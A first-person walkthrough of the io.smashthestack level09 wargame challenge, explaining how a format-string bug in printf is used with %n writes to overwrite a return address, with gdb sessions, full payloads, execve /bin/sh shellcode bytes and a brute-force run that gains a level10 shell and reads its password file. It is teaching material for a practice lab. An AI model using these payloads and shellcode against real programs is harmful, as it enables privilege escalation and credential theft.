A word on this challenge before I give the writeup. I fucking hate format strings. I was too dense to understand them when I first started venturing into the vast and confounding world of exploits. Smashthestack forced me to confront and overcome my misunderstanding of this class of exploit despite my hatred of format strings. Knowing how to navigate gdb a bit helped a tremendous amount.

The source code is in level09.c

When I first read over the source, I knew immediately that this was a format string challenge. This made me sad. Since I didn't really know how to solve this I had to read a paper or two on it. These were some of the ones I read: [paper #1](http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf) and [paper #2](http://www.exploit-db.com/wp-content/themes/exploit/docs/28476.pdf). This isn't going to be a primer on format string bugs so read through the papers if you get lost during this walkthrough.

The main format paremeter we are interested in is `%n`. This will write the number of bytes printed out so far by `printf` to an address on the stack. And it just so happens that we can specify the address! So let's just go over something really quickly. `printf` is a function like any other and accepts an unlimited number of parameters. For each % format parameter in the string we present to `printf`, it grabs a value on the stack for where it thinks the argument should be. You can see this if you run level9 as shown below:
```
level9@io:/levels$ ./level09 %08x 
bffffe8elevel9@io:/levels$
```

As you can see, we were able to grab an address off the stack. It we do this multiple times this is the result.
```
level9@io:/levels$ ./level09 $(python -c 'print "%08x."*10')
bffffe5c.000003ff.00160d7c.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.
```

We see a repeating ASCII pattern on the stack and it's the ASCII characters "%08x.". So we can control the data on the stack after a certain point. What this means is that combined with the `%n` format parameter, we can write an integer to an address of our choosing. This is how we'll overwrite the return address one byte at a time and solve the challenge. 

Taking into account the fact that `%n` writes the number bytes printed so far, we'll have to play with the buffer a bit to overwrite the return address with a full, valid address. We can accomplish this with another neat feature of format strings where we can specify the number of characters to print for the format parameter. For example, When we type `%08x`, we're asking `printf` to print out a value on the stack as a hexadecimal value with eight characters. If you look at the previous example where we dump the first 10 dwords on the stack, we see `000003ff`. If we had just put `%x`, it would have just printed `3ff`.
```
level9@io:/levels$ ./level09 $(python -c 'print "%x."*10')
bffffe70.3ff.160d7c.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.
```

See? It looks like our data is on the stack three dwords down starting with the 252e7825. Just to make it a little clearer, let's look at one more example.
```
level9@io:/levels$ ./level09 AAAA$(python -c 'print "%08x."*5')
AAAAbffffe70.000003ff.00160d7c.41414141.78383025.
``` 

So we write AAAA at the start of the buffer and we see 41414141 show up after the first three dwords on the stack. If we specify an address using those four bytes instead of putting AAAA, put some junk format parameters in our buffer to move past the first three dwords on the stack (bffffe70, 000003ff, and 00160d7c) and put a `%n` on the end of our buffer, we can see that we write the number of bytes printed to the address we specified.
```
level9@io:/levels$ gdb level09

... snip ...

(gdb) break *0x080483e9 # Break on printf call
Breakpoint 1 at 0x80483e9
(gdb) x/20xw $esp
0xbffff880: 0xbffff890  0xbffffe7f  0x000003ff  0x00160d7c
0xbffff890: 0x41414141  0x00000000  0x00000000  0x00000000
0xbffff8a0: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff8b0: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff8c0: 0x00000000  0x00000000  0x00000000  0x00000000
(gdb) run $(python -c 'print "\xc0\xf8\xff\xbf" + "%08x"*3 + "%n"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /levels/level09 $(python -c 'print "\xc0\xf8\xff\xbf" + "%08x"*3 + "%n"')

Breakpoint 1, 0x080483e9 in main ()
1: x/10i $eip
=> 0x80483e9 <main+69>: call   0x80482ec <printf@plt>
   0x80483ee <main+74>: mov    eax,0x0
   0x80483f3 <main+79>: leave  
   0x80483f4 <main+80>: ret    
   0x80483f5:   nop
   0x80483f6:   nop
   0x80483f7:   nop
   0x80483f8:   nop
   0x80483f9:   nop
   0x80483fa:   nop
(gdb) x/xw 0xbffff8c0
0xbffff8c0:  0x00000000
(gdb) ni
0x080483ee in main ()
1: x/10i $eip
=> 0x80483ee <main+74>: mov    eax,0x0
   0x80483f3 <main+79>: leave  
   0x80483f4 <main+80>: ret    
   0x80483f5:   nop
   0x80483f6:   nop
   0x80483f7:   nop
   0x80483f8:   nop
   0x80483f9:   nop
   0x80483fa:   nop
   0x80483fb:   nop
(gdb) x/xw 0xbffff8c0
0xbffff8c0:   0x0000001c
```

As you can see, I picked an address on the stack to write to and placed the bytes at the beginning of the buffer, put three junk format paramters to walk over the first three dwords on the stack, then put a `%n` where our address 0xbffff8c0 would be and we actually wrote 0x1c to that location! So here's what we need: 1) The base value of what we write to an address (I'll explain this in a minute), 2) the location of the return address, and 3) an address with which we can overwrite the return address and point back to our buffer on the stack.

Our buffer is going to need to take the form of `[ADDRESS]JUNK[ADDRESS+1byte]JUNK[ADDRESS+2bytes]JUNK[ADDRESS+3bytes]%08x%08x%08x%n%08x%n%08x%n%08x%n`. Let's break this down a bit. [ADDRESS] is the address that we want to overwrite: the location on the stack where we can find the return address. We increment this by one byte each time because we're going to overwrite this address one byte at a time. So that explains where #2 comes in above. We have four bytes of junk in between each address because we are going to need our `%x` format parameters to pad the output so that we write the correct value to each byte of the return address overwrite. So to find the base value that I mentioned in #1, we need to pick and address that we can view on the stack and write the buffer in as shown above and see what address we end up writing. An example is shown below.
```
(gdb) run $(python -c 'print "\xc0\xf8\xff\xbfJUNK\xc1\xf8\xff\xbfJUNK\xc2\xf8\xff\xbfJUNK\xc3\xf8\xff\xbf" + "%08x%08x%08x%n%08x%n%08x%n%08x%n"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /levels/level09 $(python -c 'print "\xc0\xf8\xff\xbfJUNK\xc1\xf8\xff\xbfJUNK\xc2\xf8\xff\xbfJUNK\xc3\xf8\xff\xbf" + "%08x%08x%08x%n%08x%n%08x%n%08x%n"')

Breakpoint 1, 0x080483e9 in main ()
1: x/10i $eip
=> 0x80483e9 <main+69>: call   0x80482ec <printf@plt>
   0x80483ee <main+74>: mov    eax,0x0
   0x80483f3 <main+79>: leave  
   0x80483f4 <main+80>: ret    
   0x80483f5:   nop
   0x80483f6:   nop
   0x80483f7:   nop
   0x80483f8:   nop
   0x80483f9:   nop
   0x80483fa:   nop
(gdb) x/xw 0xbffff8c00xbffff8c0: 0x00000000
(gdb) ni
0x080483ee in main ()
1: x/10i $eip
=> 0x80483ee <main+74>: mov    eax,0x0
   0x80483f3 <main+79>: leave  
   0x80483f4 <main+80>: ret    
   0x80483f5:   nop
   0x80483f6:   nop
   0x80483f7:   nop
   0x80483f8:   nop
   0x80483f9:   nop
   0x80483fa:   nop
   0x80483fb:   nop
(gdb) x/xw 0xbffff8c0
0xbffff8c0:   0x4c443c34
```

So the base value we're writing is 0x4c443c34, and we're writing it to 0xbffff8c0 one byte at a time. As you can see, each byte is a slightly higher value than the previous one. I have a neat little script written that will help us write a value we want to an address that we choose. The script is `format.py`. You can view the help menu by typing `python format.py -h`. You need to supply four parameters in order for this to generate the correct buffer: 1) the address to overwrite one byte ata time, 2) the value to write at that address, 3) the number of dwords on the stack before we arrive at our input, and 4) the base value (in our case, it is 0x4c443c34). Let's see 
```
user@laptop:level9$ python format.py -w 0xdeadbeef -o 0xbffff8c0 -b 0x4c443c34 -n 3
'\xc0\xf8\xff\xbfAAAA\xc1\xf8\xff\xbfAAAA\xc2\xf8\xff\xbfAAAA\xc3\xf8\xff\xbf%08x%08x%195x%n%207x%n%239x%n%49x%n'

... snip ...

(gdb) run $(python -c "print '\xc0\xf8\xff\xbfAAAA\xc1\xf8\xff\xbfAAAA\xc2\xf8\xff\xbfAAAA\xc3\xf8\xff\xbf%08x%08x%195x%n%207x%n%239x%n%49x%n'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /levels/level09 $(python -c "print '\xc0\xf8\xff\xbfAAAA\xc1\xf8\xff\xbfAAAA\xc2\xf8\xff\xbfAAAA\xc3\xf8\xff\xbf%08x%08x%195x%n%207x%n%239x%n%49x%n'")

Breakpoint 1, 0x080483e9 in main ()
1: x/10i $eip
=> 0x80483e9 <main+69>: call   0x80482ec <printf@plt>
   0x80483ee <main+74>: mov    eax,0x0
   0x80483f3 <main+79>:  leave  
   0x80483f4 <main+80>:   ret    
   0x80483f5:  nop
   0x80483f6:   nop
   0x80483f7:    nop
   0x80483f8: nop
   0x80483f9:  nop
   0x80483fa:   nop
(gdb) ni
0x080483ee in main ()
1: x/10i $eip
=> 0x80483ee <main+74>:  mov    eax,0x0
   0x80483f3 <main+79>:  leave  
   0x80483f4 <main+80>:   ret    
   0x80483f5:  nop
   0x80483f6:   nop
   0x80483f7:    nop
   0x80483f8: nop
   0x80483f9:  nop
   0x80483fa:   nop
   0x80483fb:    nop
(gdb) x/xw 0xbffff8c0
0xbffff8c0:  0xdeadbeef
```

So now that we can write any value to any address on the stack, we should try adding in our shellcode into the buffer. Let's figure out about where on the stack our shellcode will reside.
```
(gdb) run $(python -c "print '\xc0\xf8\xff\xbfAAAA\xc1\xf8\xff\xbfAAAA\xc2\xf8\xff\xbfAAAA\xc3\xf8\xff\xbf%08x%08x%195x%n%207x%n%239x%n%49x%n' + '\x90'*100 + 'SHELLCODEZZZZZZZZ'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /levels/level09 $(python -c "print '\xc0\xf8\xff\xbfAAAA\xc1\xf8\xff\xbfAAAA\xc2\xf8\xff\xbfAAAA\xc3\xf8\xff\xbf%08x%08x%195x%n%207x%n%239x%n%49x%n' + '\x90'*100 + 'SHELLCODEZZZZZZZZ'")

Breakpoint 1, 0x080483e9 in main ()
1: x/10i $eip
=> 0x80483e9 <main+69>: call   0x80482ec <printf@plt>
   0x80483ee <main+74>: mov    eax,0x0
   0x80483f3 <main+79>: leave  
   0x80483f4 <main+80>: ret    
   0x80483f5:   nop
   0x80483f6:   nop
   0x80483f7:   nop
   0x80483f8:   nop
   0x80483f9:   nop
   0x80483fa:   nop
(gdb) ni
0x080483ee in main ()
1: x/10i $eip
=> 0x80483ee <main+74>: mov    eax,0x0
0x80483f3 <main+79>:    leave  
0x80483f4 <main+80>:    ret    
0x80483f5:  nop
0x80483f6:  nop
0x80483f7:  nop
0x80483f8:  nop
0x80483f9:  nop
0x80483fa:  nop
0x80483fb:  nop
(gdb) x/40xw $esp
0xbffff7d0:   0xbffff7e0  0xbffffdcf  0x000003ff  0x00160d7c
0xbffff7e0:   0xbffff8c0  0x41414141  0xbffff8c1  0x41414141
0xbffff7f0:   0xbffff8c2  0x41414141  0xbffff8c3  0x78383025
0xbffff800:   0x78383025  0x35393125  0x256e2578  0x78373032
0xbffff810:   0x32256e25  0x25783933  0x3934256e  0x906e2578
0xbffff820:   0x90909090  0x90909090  0x90909090  0x90909090
0xbffff830:   0x90909090  0x90909090  0x90909090  0x90909090
0xbffff840:   0x90909090  0x90909090  0x90909090  0x90909090
0xbffff850:   0x90909090  0x90909090  0x90909090  0x90909090
0xbffff860:   0x90909090  0x90909090  0x90909090  0x90909090
(gdb) x/20xw $esp+0x3f0
0xbffffbc0: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffffbd0: 0x00000000  0x00000000  0x00000000  0x08000000
0xbffffbe0: 0xb7e9d515  0xb7ff0590  0x0804841b  0x0000babe
0xbffffbf0: 0x08048410  0x00000000  0xbffffc78  0xb7e84e46 <- The return address
0xbffffc00: 0x00000002  0xbffffca4  0xbffffcb0  0xb7fe0860
```

Our NOP sled starts at 0xbffff850 and the return address is at 0xbffffbfc. Let's try overwriting the return address with an address in our NOP sled.
```
(gdb) run $(python -c "print '\xfc\xfb\xff\xbfAAAA\xfd\xfb\xff\xbfAAAA\xfe\xfb\xff\xbfAAAA\xff\xfb\xff\xbf%08x%08x%36x%n%168x%n%263x%n%192x%n' + '\x90'*100 + 'SHELLCODEZZZZZZZZ'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /levels/level09 $(python -c "print '\xfc\xfb\xff\xbfAAAA\xfd\xfb\xff\xbfAAAA\xfe\xfb\xff\xbfAAAA\xff\xfb\xff\xbf%08x%08x%36x%n%168x%n%263x%n%192x%n' + '\x90'*100 + 'SHELLCODEZZZZZZZZ'")

Breakpoint 1, 0x080483e9 in main ()
1: x/10i $eip
=> 0x80483e9 <main+69>: call   0x80482ec <printf@plt>
   0x80483ee <main+74>: mov    eax,0x0
   0x80483f3 <main+79>: leave  
   0x80483f4 <main+80>: ret    
   0x80483f5:   nop
   0x80483f6:   nop
   0x80483f7:   nop
   0x80483f8:   nop
   0x80483f9:   nop
   0x80483fa:   nop
(gdb) ni
0x080483ee in main ()
1: x/10i $eip
=> 0x80483ee <main+74>:     mov    eax,0x0
    0x80483f3 <main+79>:    leave  
    0x80483f4 <main+80>:    ret    
    0x80483f5:  nop
    0x80483f6:  nop
    0x80483f7:  nop
    0x80483f8:  nop
    0x80483f9:  nop
    0x80483fa:  nop
    0x80483fb:  nop
(gdb) x/20xw $esp+0x3f0
0xbffffbc0:   0x00000000  0x00000000  0x00000000  0x00000000
0xbffffbd0:   0x00000000  0x00000000  0x00000000  0x08000000
0xbffffbe0:   0xb7e9d515  0xb7ff0590  0x0804841b  0x0000babe
0xbffffbf0:   0x08048410  0x00000000  0xbffffc78  0xbffff850 <- We wrote over the return address!
0xbffffc00:   0x00000002  0xbffffca4  0xbffffcb0  0xb7fe0860
```

Now if we replace SHELLCODEZZZZZZZZ with our actual shellcode, this is the result:
```
(gdb) run $(python -c "print '\xfc\xfb\xff\xbfAAAA\xfd\xfb\xff\xbfAAAA\xfe\xfb\xff\xbfAAAA\xff\xfb\xff\xbf%08x%08x%36x%n%168x%n%263x%n%192x%n' + '\x90'*100 + '\x33\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /levels/level09 $(python -c "print '\xfc\xfb\xff\xbfAAAA\xfd\xfb\xff\xbfAAAA\xfe\xfb\xff\xbfAAAA\xff\xfb\xff\xbf%08x%08x%36x%n%168x%n%263x%n%192x%n' + '\x90'*100 + '\x33\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")

Breakpoint 1, 0x080483e9 in main ()
1: x/10i $eip
=> 0x80483e9 <main+69>: call   0x80482ec <printf@plt>
   0x80483ee <main+74>: mov    eax,0x0
   0x80483f3 <main+79>: leave  
   0x80483f4 <main+80>: ret    
   0x80483f5:   nop
   0x80483f6:   nop
   0x80483f7:   nop
   0x80483f8:   nop
   0x80483f9:   nop
   0x80483fa:   nop
(gdb) ni
0x080483ee in main ()
1: x/10i $eip
=> 0x80483ee <main+74>: mov    eax,0x0
   0x80483f3 <main+79>: leave  
   0x80483f4 <main+80>: ret    
   0x80483f5:   nop
   0x80483f6:   nop
   0x80483f7:   nop
   0x80483f8:   nop
   0x80483f9:   nop
   0x80483fa:   nop
   0x80483fb:   nop
(gdb) x/40xw $esp
0xbffff7d0:   0xbffff7e0  0xbffffdc7  0x000003ff  0x00160d7c
0xbffff7e0:   0xbffffbfc  0x41414141  0xbffffbfd  0x41414141
0xbffff7f0:   0xbffffbfe  0x41414141  0xbffffbff  0x78383025
0xbffff800:   0x78383025  0x78363325  0x31256e25  0x25783836
0xbffff810:   0x3632256e  0x6e257833  0x32393125  0x906e2578
0xbffff820:   0x90909090  0x90909090  0x90909090  0x90909090
0xbffff830:   0x90909090  0x90909090  0x90909090  0x90909090
0xbffff840:   0x90909090  0x90909090  0x90909090  0x90909090
0xbffff850:   0x90909090  0x90909090  0x90909090  0x90909090
0xbffff860:   0x90909090  0x90909090  0x90909090  0x90909090
(gdb) x/40xw $esp+0x3f0
0xbffffbc0:   0x00000000  0x00000000  0x00000000  0x00000000
0xbffffbd0:   0x00000000  0x00000000  0x00000000  0x08000000
0xbffffbe0:   0xb7e9d515  0xb7ff0590  0x0804841b  0x0000babe
0xbffffbf0:   0x08048410  0x00000000  0xbffffc78  0xbffff850 <- We did it again
0xbffffc00:   0x00000002  0xbffffca4  0xbffffcb0  0xb7fe0860
0xbffffc10:   0xb7ff6821  0x0177ff8e  0xb7ffeff4  0x0804820c
0xbffffc20:   0x00000001  0xbffffc60  0xb7fefc16  0xb7fffac0
0xbffffc30:   0xb7fe0b58  0xb7fceff4  0x00000000  0x00000000
0xbffffc40:   0xbffffc78  0xf7178180  0xd8739790  0x00000000
0xbffffc50:   0x00000000  0x00000000  0x00000002  0x08048300
(gdb) c
Continuing.
process 19542 is executing new program: /bin/bash
sh-4.2$
```

Since the addresses will differ outside of the debugger, let's run it and see.
```
level9@io:/levels$ ./level09 $(python -c "print '\xfc\xfb\xff\xbfAAAA\xfd\xfb\xff\xbfAAAA\xfe\xfb\xff\xbfAAAA\xff\xfb\xff\xbf%08x%08x%36x%n%168x%n%263x%n%192x%n' + '\x90'*100 + '\x33\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
????AAAA????AAAA????AAAA????bffffdd1000003ff                              160d7c                                                                                                                                                                41414141                                                                                                                                                                                                                                                               41414141                                                                                                                                                                                        41414141????????????????????????????????????????????????????????????????????????????????????????????????????3?1?Ph//shh/bin??PS??
        ̀level9@io:/levels$ 
```

No such luck. I wrote a little script to brute force the values until it worked. Here is the result:
```
level9@io:/levels$ python /tmp/ZZZ/solve.py 0x4c443c34
[+] Trying buf '<\xfc\xff\xbfAAAA=\xfc\xff\xbfAAAA>\xfc\xff\xbfAAAA?\xfc\xff\xbf%08x%08x%100x%n%104x%n%263x%n%192x%n\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x903\xd21\xc0Ph//shh/bin\x89\xe3PS\x89\xe1\xb0\x0b\xcd\x80'
sh: ???AAAA=???AAAA: No such file or directory
[+] Trying buf '8\xfc\xff\xbfAAAA9\xfc\xff\xbfAAAA:\xfc\xff\xbfAAAA;\xfc\xff\xbf%08x%08x%96x%n%108x%n%263x%n%192x%n\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x903\xd21\xc0Ph//shh/bin\x89\xe3PS\x89\xe1\xb0\x0b\xcd\x80'
8???AAAA9???AAAA:???AAAAsh: ???%08x%08x%96x%n%108x%n%263x%n%192x%n????????????????????????????????????????????????????????????????????????????????????????????????????3?1?Ph//shh/bin??PS??
̀: No such file or directory
[+] Trying buf '4\xfc\xff\xbfAAAA5\xfc\xff\xbfAAAA6\xfc\xff\xbfAAAA7\xfc\xff\xbf%08x%08x%92x%n%112x%n%263x%n%192x%n\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x903\xd21\xc0Ph//shh/bin\x89\xe3PS\x89\xe1\xb0\x0b\xcd\x80'
4???AAAA5???AAAA6???AAAA7???bffffde5000003ff                                                                                      160d7c                                                                                                        41414141                                                                                                                                                                                                                                                               41414141                                                                                                                                                                                        41414141????????????????????????????????????????????????????????????????????????????????????????????????????3?1?Ph//shh/bin??PS??
̀[+] Trying buf '0\xfc\xff\xbfAAAA1\xfc\xff\xbfAAAA2\xfc\xff\xbfAAAA3\xfc\xff\xbf%08x%08x%88x%n%116x%n%263x%n%192x%n\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x903\xd21\xc0Ph//shh/bin\x89\xe3PS\x89\xe1\xb0\x0b\xcd\x80'
0???AAAA1???AAAA2???AAAA3???bffffde5000003ff                                                                                  160d7c                                                                                                            41414141                                                                                                                                                                                                                                                               41414141                                                                                                                                                                                        41414141????????????????????????????????????????????????????????????????????????????????????????????????????3?1?Ph//shh/bin??PS??
̀[+] Trying buf ',\xfc\xff\xbfAAAA-\xfc\xff\xbfAAAA.\xfc\xff\xbfAAAA/\xfc\xff\xbf%08x%08x%84x%n%120x%n%263x%n%192x%n\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x903\xd21\xc0Ph//shh/bin\x89\xe3PS\x89\xe1\xb0\x0b\xcd\x80'
,???AAAA-???AAAA.???AAAA/???bffffde5000003ff                                                                              160d7c                                                                                                                41414141                                                                                                                                                                                                                                                               41414141                                                                                                                                                                                        41414141????????????????????????????????????????????????????????????????????????????????????????????????????3?1?Ph//shh/bin??PS??
̀[+] Trying buf '(\xfc\xff\xbfAAAA)\xfc\xff\xbfAAAA*\xfc\xff\xbfAAAA+\xfc\xff\xbf%08x%08x%80x%n%124x%n%263x%n%192x%n\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x903\xd21\xc0Ph//shh/bin\x89\xe3PS\x89\xe1\xb0\x0b\xcd\x80'
sh: -c: line 0: syntax error near unexpected token `$'\374\377\277AAAA''
sh: -c: line 0: `./level09 (???AAAA)???AAAA*???AAAA+???%08x%08x%80x%n%124x%n%263x%n%192x%n????????????????????????????????????????????????????????????????????????????????????????????????????3?1?Ph//shh/bin??PS??
̀'
[+] Trying buf "$\xfc\xff\xbfAAAA%\xfc\xff\xbfAAAA&\xfc\xff\xbfAAAA'\xfc\xff\xbf%08x%08x%76x%n%128x%n%263x%n%192x%n\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x903\xd21\xc0Ph//shh/bin\x89\xe3PS\x89\xe1\xb0\x0b\xcd\x80"
sh: -c: line 0: unexpected EOF while looking for matching `''
sh: -c: line 1: syntax error: unexpected end of file
[+] Trying buf '\xfc\xff\xbfAAAA!\xfc\xff\xbfAAAA"\xfc\xff\xbfAAAA#\xfc\xff\xbf%08x%08x%72x%n%132x%n%263x%n%192x%n\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x903\xd21\xc0Ph//shh/bin\x89\xe3PS\x89\xe1\xb0\x0b\xcd\x80'
sh: -c: line 0: unexpected EOF while looking for matching `"'
sh: -c: line 1: syntax error: unexpected end of file
[+] Trying buf '\x1c\xfc\xff\xbfAAAA\x1d\xfc\xff\xbfAAAA\x1e\xfc\xff\xbfAAAA\x1f\xfc\xff\xbf%08x%08x%68x%n%136x%n%263x%n%192x%n\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x903\xd21\xc0Ph//shh/bin\x89\xe3PS\x89\xe1\xb0\x0b\xcd\x80'
sh-4.2$ whoami
level10
sh-4.2$ cat /home/level10/.pass
[Password for level10]
sh-4.2$ 
```

You can spend the time to make a cleaner if you wish, but if you use the solve.py script you might need to modify it a bit to make it work for you.
